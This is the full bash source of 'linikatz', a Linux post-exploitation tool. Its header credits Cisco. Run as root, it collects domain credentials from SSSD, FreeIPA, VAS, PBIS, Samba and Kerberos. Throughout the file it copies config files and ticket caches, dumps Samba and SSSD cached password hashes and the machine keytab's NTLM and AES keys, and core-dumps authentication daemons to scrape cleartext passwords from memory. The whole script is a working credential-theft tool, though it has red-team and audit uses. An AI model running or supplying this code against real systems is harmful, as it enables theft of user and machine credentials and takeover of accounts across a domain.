#!/bin/bash
# Copyright (c) 2015-2021, Cisco International Ltd
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the Cisco International Ltd nor the
#       names of its contributors may be used to endorse or promote products
#       derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL CISCO INTERNATIONAL LTD BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

DATE="$(date +%d-%m-%Y_%H-%M-%S)"
CONF_OUTPUT="0"
SSSD_HASHES_FILE="hashes.txt"
NO_FILE_OUTPUT="0"
KERBEROS_TICKET_SAVE="0"

NORMAL="0"
BOLD="1"
LIGHT="2"
ITALIC="3"
UNDERL="4"

RED="31"
GREEN="32"
YELLOW="33"
BLUE="34"
PURPLE="35"
CYAN="36"
WHITE="37"

header () {
printf " _     _       _ _         _               ____   \n"
printf "| |   (_)_ __ (_) | ____ _| |_ ____ __   _|___ \  \n"
printf "| |   | | '_ \| | |/ / _\` | __|_  / \ \ / / __) | \n"
printf "| |___| | | | | |   < (_| | |_ / /   \ V / / __/  \n"
printf "|_____|_|_| |_|_|_|\_\__,_|\__/___|   \_/ |_____| \n"
printf "\n\n"
}

usage (){
        header
        printf "Usage : ./linikatz.sh [OPTION]\n"
        printf "        [-c --conf-files] : Create a local backup of configuration files\n"
        printf "        [--hash-output=<filename>] : Sets hashes file output to the selected name\n"
        printf "        [-n --no-file] : Removes file creation\n"
        printf "        [-k --kerberos-tickets] : Save kerberos tickets in linikatz.$DATE/kerberos\n"
        printf "        [-h --help] : Print this ;)\n\n"
        exit 0
}

# Usage : 1st is type (bold, normal, ...) 2nd is color, 3 is message
stdio_message () {
        type="${1}"
        color="${2}"
        message="${3}"
        [ "$(validate_is_number "${type}")" -eq 1 ] || false
        [ "$(validate_is_number "${color}")" -eq 1 ] || false
        [ "$(validate_is_string "${message}")" -eq 1 ] || false
        printf -- "\033[%s;%sm%s\033[m\n" "${type}" "${color}" "${message}"
}

# Same as stdio_message but \n
stdio_message_raw () {
        type="${1}"
        color="${2}"
        message="${3}"
        [ "$(validate_is_number "${type}")" -eq 1 ] || false
        [ "$(validate_is_number "${color}")" -eq 1 ] || false
        [ "$(validate_is_string "${message}")" -eq 1 ] || false
        printf -- "\033[%s;%sm%s\033[m" "${type}" "${color}" "${message}"
}

stdio_message_info () {
        message="${1}"
        [ "$(validate_is_string "${message}")" -eq 1 ] || false
        stdio_message "$NORMAL" "$CYAN" "[>] ${message}" >&2
}

stdio_message_info_highlight () {
        message="${1}"
        [ "$(validate_is_string "${message}")" -eq 1 ] || false
        stdio_message "$BOLD" "$GREEN" "[+] ${message}" >&2
}

stdio_message_info_process () {
        message="${1}"
        [ "$(validate_is_string "${message}")" -eq 1 ] || false
        stdio_message "$NORMAL" "$CYAN" "       [>] ${message}" >&2
}

stdio_message_info_process_group () {
        message="${1}"
        [ "$(validate_is_string "${message}")" -eq 1 ] || false
        stdio_message "$BOLD" "$BLUE" "[*] ${message}" >&2
}

stdio_message_in_process () {
        type="${1}"
        color="${2}"
        message="${3}"
        [ "$(validate_is_number "${type}")" -eq 1 ] || false
        [ "$(validate_is_number "${color}")" -eq 1 ] || false
        [ "$(validate_is_string "${message}")" -eq 1 ] || false
        printf -- "\033[%s;%sm  %s\033[m\n" "${type}" "${color}" "${message}"
}

stdio_message_in_process_raw () {
        type="${1}"
        color="${2}"
        message="${3}"
        [ "$(validate_is_number "${type}")" -eq 1 ] || false
        [ "$(validate_is_number "${color}")" -eq 1 ] || false
        [ "$(validate_is_string "${message}")" -eq 1 ] || false
        printf -- "\033[%s;%sm  %s\033[m" "${type}" "${color}" "${message}"
}

stdio_message_error () {
        message="${1}"
        [ "$(validate_is_string "${message}")" -eq 1 ] || false
        stdio_message "$BOLD" "$RED" "[!] ${message}" >&2
}

validate_is_string () {
        value="${1}"
        if [ "$(validate_matches_regex "${value}" ".*")" -eq 1 ]
        then
                printf -- "1\n"
        else
                stdio_message_error "invalid string: ${value}"
                printf -- "0\n"
        fi
}

validate_matches_regex () {
        value="${1}"
        regex="${2}"
        if [ -n "$(printf -- "%s" "${value}" | egrep -- "$regex")" ]
        then
                printf -- "1\n"
        else
                printf -- "0\n"
        fi
}

validate_is_number () {
        value="${1}"
        if [ "$(validate_matches_regex "${value}" "^[0-9]+$")" -eq 1 ]
        then
                printf -- "1\n"
        else
                stdio_message_error "validate_is_number_error"
                printf -- "0\n"
        fi
}

file_list () {
        filename="${1}"
        [ "$(validate_is_string "${filename}")" -eq 1 ] || false
        if [ "$(file_exists "${filename}")" -eq 1 ]
        then
                find "${filename}" -type f
        fi
}

file_exists () {
        filename="${1}"
        [ "$(validate_is_string "${filename}")" -eq 1 ] || false
        if [ -e "${filename}" ]
        then
                printf -- "1\n"
        else
                printf -- "0\n"
        fi
}

file_is_regular () {
        filename="${1}"
        [ "$(validate_is_string "${filename}")" -eq 1 ] || false
        if [ -f "${filename}" ]
        then
                printf -- "1\n"
        else
                printf -- "0\n"
        fi
}

file_is_directory () {
        filename="${1}"
        [ "$(validate_is_string "${filename}")" -eq 1 ] || false
        if [ -d "${filename}" ]
        then
                printf -- "1\n"
        else
                printf -- "0\n"
        fi
}

file_steal () {
        filename="${1}"
        [ "$(validate_is_string "${filename}")" -eq 1 ] || false
        if [ "$(file_exists "${filename}")" -eq 1 ]
        then
                ls -l "${filename}"
                subdirectoryname=config
                directoryname="linikatz.$DATE"
                fullpath="${directoryname}/${subdirectoryname}"

                if [ "$(file_is_directory "${directoryname}")" -ne 1 ]
                then
                        mkdir "${directoryname}"
                fi
                if [ "$(file_is_directory "${fullpath}")" -ne 1 ]
                then
                        mkdir "${fullpath}"
                fi
                stolenfilename="${fullpath}/$(printf -- "%s" "${filename}" | tr "/" "_")"
                cp "${filename}" "${stolenfilename}"
        fi
}

config_steal () {
        for filename in "$@"
        do
                [ "$(validate_is_string "${filename}")" -eq 1 ] || false
                if [ "$(file_is_directory "${filename}")" -eq 1 ]
                then
                        file_list "${filename}" | while read filename
                        do
                                file_steal "${filename}"
                        done
                else
                        if [ "$(file_is_regular "${filename}")" -eq 1 ]
                        then
                                file_steal "${filename}"
                        fi
                fi
        done
}

krb_file_steal () {
        filename="${1}"
        [ "$(validate_is_string "${filename}")" -eq 1 ] || false
        if [ "$(file_exists "${filename}")" -eq 1 ]
        then
                subdirectoryname=kerberos_tickets
                directoryname="linikatz.$DATE"
                fullpath="${directoryname}/${subdirectoryname}"

                if [ "$(file_is_directory "${directoryname}")" -ne 1 ]
                then
                        mkdir "${directoryname}"
                fi
                if [ "$(file_is_directory "${fullpath}")" -ne 1 ]
                then
                        mkdir "${fullpath}"
                fi
                stolenfilename="${fullpath}/$(printf -- "%s" "${filename}" | tr "/" "_")"
                cp "${filename}" "${stolenfilename}"
        fi
}

kerberos_steal () {
        for filename in "$@"
        do
                [ "$(validate_is_string "${filename}")" -eq 1 ] || false
                if [ "$(file_is_directory "${filename}")" -eq 1 ]
                then
                        file_list "${filename}" | while read filename
                        do
                                krb_file_steal "${filename}"
                        done
                else
                        if [ "$(file_is_regular "${filename}")" -eq 1 ]
                        then
                                krb_file_steal "${filename}"
                        fi
                fi
        done
}

process_list () {
        pattern="${1}"
        [ "$(validate_is_string "${pattern}")" -eq 1 ] || false
        ps -aeo ruser,rgroup,pid,ppid,args | egrep -v "PID" | egrep "${pattern}" | egrep -v "grep" | while read userid groupid processid parentid command arguments
        do
                printf -- "%s\n" "${processid}"
        done
}

process_dump () {
        processid="${1}"
        directoryname="linikatz.$DATE"
        [ "$(validate_is_number "${processid}")" -eq 1 ] || false
        if [ "$(file_is_directory "${directoryname}")" -ne 1 ]
        then
                mkdir "${directoryname}"
        fi
        if [ "$(file_is_directory "${directoryname}/processes")" -ne 1 ]
        then
                mkdir "${directoryname}/processes"
        fi
        dumpedfilename="${directoryname}/processes/process."$(ps -p $processid -o comm=)""
        gcore -o "${dumpedfilename}" "${processid}" >/dev/null 2>&1
        printf -- "%s\n" "${dumpedfilename}"
}

# Parameter parser
while [ -n "${1}" ]
do
        case "${1}" in
                --help|-h)
                        usage
                        ;;
                --conf-files|-c)
                        CONF_OUTPUT="1"
                        ;;
                --hash-output=*)
                        SSSD_HASHES_FILE="${1#*=}"
                        shift
                        ;;
                --no-file|-n)
                        NO_FILE_OUTPUT="1"
                        ;;
                --kerberos-tickets|-k)
                        KERBEROS_TICKET_SAVE="1"
                        ;;
        esac
        shift
done

header

# Output option check
if [ $NO_FILE_OUTPUT -eq 1 ]; then
        echo "I'm in!"
        echo "$CONF_OUTPUT $KERBEROS_TICKET_SAVE"
        CONF_OUTPUT="0"
        KERBEROS_TICKET_SAVE="0"
fi


# Check that tdbdump is installed
if ! which "tdbdump" >/dev/null; then
        stdio_message_error "tdbdump is not installed so it is not possible to ANALYZE ldb files"
        stdio_message "0" "$WHITE" "=> Install it with 'apt install tdb-tools'"
        exit 127
fi

# Check that the user is root or a member of sudoers
if [ "$(id -u)" -gt "0" ] >/dev/null; then
        stdio_message_error "This program must be run as root"
        exit 1337
fi

#### Local copy of different configurations (FreeIPA, SSSD, etc) ####

if [ $CONF_OUTPUT -eq 1 ]; then
        stdio_message "$NORMAL" "$WHITE" "	################################"
        stdio_message_raw "$NORMAL" "$WHITE" "	 ====  "
        stdio_message_raw "$BOLD" "$PURPLE" "Configuration copy"
        stdio_message "$NORMAL" "$WHITE" "  ===="
        stdio_message "$NORMAL" "$WHITE" "	   ############################"
        echo ""

        stdio_message_info "Collecting FreeIPA configuration files"
        config_steal /run/ipa/ccaches /var/lib/dirsrv /etc/dirsrv /var/lib/softhsm /etc/pki /etc/ipa
        echo ""

        stdio_message_info "Collecting SSSD configuration files"
        config_steal /var/lib/sss /etc/sssd
        echo ""

        stdio_message_info "Collecting VAS configuration files"
        config_steal /var/opt/quest /etc/opt/quest
        echo ""

        stdio_message_info "Collecting PBIS configuration files"
        config_steal /var/lib/pbis /etc/pbis
        echo ""

        stdio_message_info "Collecting Samba configuration files"
        config_steal /var/lib/samba /var/cache/samba /etc/samba
        echo ""

        stdio_message_info "Collecting Kerberos configuration file"
        config_steal /etc/krb5.conf
        echo ""
fi

#### Samba dump ####

if [ -n "$(file_list /var/lib/samba/private)" ] || [ "$(file_is_regular /var/lib/samba/passdb.tdb)" -eq 1 ]; then
        stdio_message "$NORMAL" "$WHITE" "	########################"
        stdio_message_raw "$NORMAL" "$WHITE" "	 ====  "
        stdio_message_raw "$BOLD" "$PURPLE" "Samba Dump"
        stdio_message "$NORMAL" "$WHITE" "  ===="
        stdio_message "$NORMAL" "$WHITE" "	  ####################"
        echo ""
fi

if [ -n "$(file_list /var/lib/samba/private)" ]; then
        stdio_message_info "Samba machine secrets"
        file_list /var/lib/samba/private | while read filename
        do
                if [ "$(file_is_regular "${filename}")" -eq 1 ]
                then
                        tdbdump "${filename}" | egrep -A 1 "_PASSWORD"
                fi
        done
        echo ""
fi

if [ "$(file_is_regular /var/lib/samba/passdb.tdb)" -eq 1 ]; then
        stdio_message_info "Samba hashes"
        pdbedit -s /etc/samba/smb.conf -L -w
        echo ""
fi


#### SSSD hash dump ####
if [ "$(file_is_regular /var/lib/sss/db/*ldb)" -eq 1 ]; then
        stdio_message "$NORMAL" "$WHITE" "	##############################"
        stdio_message_raw "$NORMAL" "$WHITE" "	 ====  "
        stdio_message_raw "$BOLD" "$PURPLE" "SSSD Hashes Dump"
        stdio_message "$NORMAL" "$WHITE" "  ===="
        stdio_message "$NORMAL" "$WHITE" "	  ##########################"

        for db_ in $(ls /var/lib/sss/db/*ldb)
        do
                echo ""
                number_of_accounts=$(tdbdump $db_ | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1 | sort -u | wc -l)
                if [ "$number_of_accounts" -gt "0" ]; then
                        stdio_message_info_highlight "$number_of_accounts hashes found in $db_"
                else
                        stdio_message_info "No hash found in $db_"
                fi

                for account_ in $(tdbdump $db_ | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1 | sort -u)
                do
                        echo ""
                        stdio_message_raw "$NORMAL" "$WHITE" "Account :	"
                        stdio_message "$BOLD" "$YELLOW" "$account_"
                        hash_=$(tdbdump $db_ | grep cachedPassword | grep $account_ | grep -o "\$6\$.*achedPassword" | awk -F 'Type' '{print $1}' | awk -F 'cachedPassword' '{print $1}' | awk -F 'lastCachedPassword' '{print $1}' | head -c 106)
                        stdio_message_raw "$NORMAL" "$WHITE" "Hash :		"
                        stdio_message "$BOLD" "$RED" "$hash_"
                        echo ""
                        if [ $NO_FILE_OUTPUT -eq 0 ]
                        then
                                        if [ "$(file_is_directory linikatz.$DATE)" -eq 0 ]
                                        then
                                                mkdir linikatz.$DATE
                                        fi
                                echo $account_:$hash_ >> linikatz.$DATE/$SSSD_HASHES_FILE

                        fi
                done
                if [ "$number_of_accounts" -gt "0" ]; then
                        echo ""
                        stdio_message "$BOLD" "$BLUE" " =====> Adding these hashes to the $SSSD_HASHES_FILE file <====="
                fi
        done
        echo ""
fi

####  VAS hash dump ####

if [ "$(file_is_directory /var/opt/quest)" -eq 1 ]; then
        stdio_message "$NORMAL" "$WHITE" "	#############################"
        stdio_message_raw "$NORMAL" "$WHITE" "	 ====  "
        stdio_message_raw "$BOLD" "$PURPLE" "VAS Hashes Dump"
        stdio_message "$NORMAL" "$WHITE" "  ===="
        stdio_message "$NORMAL" "$WHITE" "	  #########################"
        echo ""

        sqlite3 /var/opt/quest/vas/authcache/vas_auth.vdb "SELECT krb5pname, sha1hash, legacyHash FROM authcache"
fi

#### Kerberos machine tickets ####
if [ "$(file_is_directory /var/lib/pbis)" -eq 1 ] || [ "$(file_is_directory /var/opt/quest/vas)" -eq 1 ] || [ "$(file_is_directory /var/lib/sss/db)" -eq 1 ]; then
        stdio_message "$NORMAL" "$WHITE" "	##########################################"
        stdio_message_raw "$NORMAL" "$WHITE" "	 ====  "
        stdio_message_raw "$BOLD" "$PURPLE" "Kerberos Machine Ticket Dump"
        stdio_message "$NORMAL" "$WHITE" "  ===="
        stdio_message "$NORMAL" "$WHITE" "	  ######################################"
        echo ""
fi

if ! which "klist" >/dev/null; then
        stdio_message_error "klist is not installed so it is not possible to list and read kerberos tickets"
        stdio_message "0" "$WHITE" "=> Install it with 'apt install krb5-user'"
        exit 128
fi

# SSSD tickets
if [ "$(file_is_directory /var/lib/sss/db)" -eq 1 ]; then
        stdio_message_info "SSSD tickets"
        for filename in /var/lib/sss/db/ccache_*
        do
                if [ "$(file_is_regular "${filename}")" -eq 1 ]
                then
                        /usr/bin/klist -c "${filename}" -e -d -f
                        echo ""
                fi
        done
fi
if [ $KERBEROS_TICKET_SAVE -eq 1 ]; then
        stdio_message "$NORMAL" "$GREEN" "[+] Adding machine kerberos ticket to /kerberos"
        kerberos_steal /var/lib/sss/db/ccache_*
fi
echo ""

# VAS tickets
if [ "$(file_is_directory /var/opt/quest/vas)" -eq 1 ]; then
        stdio_message_info "VAS tickets"
        if [ "$(file_is_regular /etc/opt/quest/vas/host.keytab)" -eq 1 ]
        then
                /opt/quest/bin/ktutil --keytab=/etc/opt/quest/vas/host.keytab
        fi
        echo ""
fi

# PBIS tickets
if [ "$(file_is_directory /var/lib/pbis)" -eq 1 ]; then
        stdio_message_info "PBIS tickets"
        if [ "$(file_is_regular /etc/krb5.keytab)" -eq 1 ]
        then
                printf "read_kt /etc/krb5.keytab\nlist\nquit\n" | /opt/pbis/bin/ktutil
        fi
        for filename in /var/lib/pbis/krb5cc_lsass*
        do
                if [ "$(file_is_regular "${filename}")" -eq 1 ]
                then
                        /opt/pbis/bin/klist -c "${filename}" -e -d -f
                fi
        done
fi

#### Kerberos User tickets ####
if [ "$(file_is_regular /tmp/krb5*)" -eq 1 ] || [ "$(file_is_regular /var/lib/sss/secrets/secrets.ldb)" -eq 1 ]; then

        stdio_message "$NORMAL" "$WHITE" "	#######################################"
        stdio_message_raw "$NORMAL" "$WHITE" "	 ====  "
        stdio_message_raw "$BOLD" "$PURPLE" "Kerberos User Ticket Dump"
        stdio_message "$NORMAL" "$WHITE" "  ===="
        stdio_message "$NORMAL" "$WHITE" "	  ###################################"
        echo ""
fi

for filename in /tmp/krb5*
do
        if [ "$(file_is_regular "${filename}")" -eq 1 ]
        then
                stdio_message_info "User Kerberos tickets"
                if [ "$(file_is_regular /usr/bin/klist)" -eq 1 ]
                then
                        /usr/bin/klist -c "${filename}" -e -d -f
                        echo ""
                else
                        if [ "$(file_is_regular /opt/quest/bin/klist)" -eq 1 ]
                        then
                                /opt/quest/bin/klist -c "${filename}" -v --hidden
                                echo ""
                        else
                                if [ "$(file_is_regular /opt/pbis/bin/klist)" -eq 1 ]
                                then
                                        /opt/pbis/bin/klist -c "${filename}" -e -d -f
                                        echo ""
                                fi
                        fi
                fi
        fi
done

if [ $KERBEROS_TICKET_SAVE -eq 1 ]; then
        stdio_message "$NORMAL" "$GREEN" "[+] Adding user tickets to /kerberos"

        kerberos_steal /tmp/krb5*
fi

#### KCM Kerberos tickets ####

if [ "$(file_is_regular /var/lib/sss/secrets/secrets.ldb)" -eq 1 ]; then
        stdio_message_info "KCM Kerberos tickets"
        if [ "$(file_is_regular /var/lib/sss/secrets/secrets.ldb)" -eq 1 ]
        then
                # TODO check this actually works, I'm guessing based on https://github.com/mandiant/SSSDKCMExtractor/blob/master/SSSDKCMExtractor.py
                tdbdump /var/lib/sss/secrets/secrets.ldb | egrep -A 1 "secret"
                stdio_message "$BOLD" "$YELLOW" "[!]You'll need /var/lib/sss/secrets/.secrets.mkey to decrypt this"
        fi
fi
echo ""

#### Memory dump ####

stdio_message "$NORMAL" "$WHITE" "	#########################"
stdio_message_raw "$NORMAL" "$WHITE" "	 ====  "
stdio_message_raw "$BOLD" "$PURPLE" "Memory Dump"
stdio_message "$NORMAL" "$WHITE" "  ===="
stdio_message "$NORMAL" "$WHITE" "	  #####################"
echo ""

if ! which "gcore" >/dev/null; then
        stdio_message_error "gcore is not installed so it is not possible to dump memory"
        stdio_message "0" "$WHITE" "=> Install it with 'apt install gdb'"
        exit 128
fi

process_list "sss" | while read processid
do
        stdio_message_info_process_group "SSSD processes dump"
        stdio_message_info_process "Dumping "$(ps -p $processid -o comm=)" (${processid})"
        process_dump "${processid}" | while read filename
        do
                hash_tmp="$([ "$(file_is_regular "${filename}.${processid}")" -eq 1 ] && strings "${filename}.${processid}" | egrep "\\\$6\\\$" | sort | uniq )"
                tab="$(echo "$hash_tmp" | head -n 1)"

                if [ -z $tab ]
                then
                        echo ""
                else
                        stdio_message_in_process "$BOLD" "$GREEN" "[+] Hash(es) found !"
                        while IFS= read -r line
                        do
                                if [ ${#line} -eq 106 ]
                                then
                                        line_clean=$(echo "$line" | grep -oP '\$6\$.{103}')
                                        stdio_message_in_process "$NORMAL" "$YELLOW" "  $line_clean"
                                fi
                        done < <(printf '%s\n' "$hash_tmp")
                        echo ""
                fi

                grep="$([ "$(file_is_regular "${filename}.${processid}")" -eq 1 ] && strings "${filename}.${processid}" | egrep  "[0-9]{10}_XXXXXX" -A 2)"
                count_tmp="$([ "$(file_is_regular "${filename}.${processid}")" -eq 1 ] && strings "${filename}.${processid}" | egrep -c "[0-9]{10}_XXXXXX" -A 2)"
                if [ "${count_tmp}" -ne "0" ]
                then
                        cursor="1"
                        for ((i = 0 ; i < $count_tmp ; i++)); do
                                grep_tmp="$(echo "$grep" | sed -n "$cursor, $(($cursor+3))p")"
                                passw_tmp="$(echo "$grep_tmp" | sed -n '3p')"
                                user_id_ticket="$(echo "$grep_tmp" | head -n 1 | grep -oE '[0-9]{10}')"
                                ticket_name="$(ls /tmp | grep krb5cc_${user_id_ticket})"
                                username="$(/usr/bin/klist -c "/tmp/${ticket_name}" | grep "Default principal" | cut -d ':' -f 2 | cut -d '@' -f 1 | tr -d ' ')"
                                if [ -n "${passw_tmp}" ]
                                then
                                        stdio_message_in_process "$BOLD" "$GREEN" "[+] Clear password(s) found !"
                                        stdio_message_in_process_raw "$NORMAL" "$WHITE" "  Account :	"
                                        stdio_message_in_process "$BOLD" "$RED" "$username"
                                        stdio_message_in_process_raw "$NORMAL" "$WHITE" "  Password :	"
                                        stdio_message_in_process "$BOLD" "$RED" "$passw_tmp"
                                        stdio_message_in_process_raw "$NORMAL" "$WHITE" "  Domain UID :"
                                        stdio_message_in_process "$BOLD" "$YELLOW" "$user_id_ticket"
                                fi
                                echo ""
                                cursor=$(( $cursor + 4))
                        done
                fi
        done
done
echo ""

# VAS process dump
if [ -n "$(process_list vasd)" ]; then
        stdio_message_info_process_group "VAS processes dump"
        process_list "vasd" | while read processid
        do
                stdio_message_info_process "Dumping "$(ps -p $processid -o comm=)" (${processid})"
                process_dump "${processid}" | while read filename
                do
                        [ "$(file_is_regular "${filename}.${processid}")" -eq 1 ] && strings "${filename}.${processid}" | grep -E "MAPI|\\\$6\\\$" | sort | uniq
                done
        done
        echo ""
fi

# PBIS process dump
if [ -n "$(process_list "lwsmd|lw-")" ]; then
        stdio_message_info_process_group "PBIS processes"
        process_list "lwsmd|lw-" | while read processid
        do
                stdio_message_info_process "Dumping "$(ps -p $processid -o comm=)" (${processid})"
                process_dump "${processid}" | while read filename
                do
                        [ "$(file_is_regular "${filename}.${processid}")" -eq 1 ] && strings "${filename}.${processid}" | grep -E "MAPI|\\\$6\\\$" | sort | uniq
                done
        done
        echo ""
fi

# Remove files and processes
if [ "$NO_FILE_OUTPUT" -eq 1 ]; then
        sudo rm -rf linikatz.$DATE
fi

# Keytab hash extraction
if [ "$(file_is_regular /etc/krb5.keytab)" -eq 1 ]; then
        stdio_message "$NORMAL" "$WHITE" "	##############################"
        stdio_message_raw "$NORMAL" "$WHITE" "	 ====  "
        stdio_message_raw "$BOLD" "$PURPLE" "Keytab hash dump"
        stdio_message "$NORMAL" "$WHITE" "  ===="
        stdio_message "$NORMAL" "$WHITE" "	  ##########################"
        echo ""

        tmp="$(sudo klist -t -K -e -k /etc/krb5.keytab | sed -n '4,6p' | awk '{print $4,$5,$6}')"
        machine_name="$(echo "$tmp" | awk '{print $1}' | head -n 1 | cut -d '@' -f1)"
        domain="$(echo "$tmp" | awk '{print $1}' | head -n 1 | cut -d '@' -f2)"
        machine_ntlm="$(echo "$tmp" | grep "arcfour" | awk '{print $3}' | cut -c 4-35 )"
        machine_aes_128="$(echo "$tmp" | grep "aes128" | awk '{print $3}' | cut -c 4-35 )"
        machine_aes_256="$(echo "$tmp" | grep "aes256" | awk '{print $3}' | cut -c 4-67 )"

        stdio_message_raw "$NORMAL" "$WHITE" "Account :	"
        stdio_message "$BOLD" "$GREEN" "$machine_name"
        stdio_message_raw "$NORMAL" "$WHITE" "Domain :	"
        stdio_message "$BOLD" "$CYAN" "@$domain"
        echo ""
        stdio_message_raw "$NORMAL" "$WHITE" "NTLM hash :	"
        stdio_message "$BOLD" "$RED" "$machine_ntlm"
        stdio_message_raw "$NORMAL" "$WHITE" "AES-128 key :	"
        stdio_message "$BOLD" "$RED" "$machine_aes_128"
        stdio_message_raw "$NORMAL" "$WHITE" "AES-256 key :	"
        stdio_message "$BOLD" "$RED" "$machine_aes_256"
        echo ""

        if [ $KERBEROS_TICKET_SAVE -eq 1 ]
        then
                stdio_message "$NORMAL" "$GREEN" "[+] Adding machine keytab to /kerberos"
                kerberos_steal /etc/krb5.keytab
        fi
        echo ""
fi 
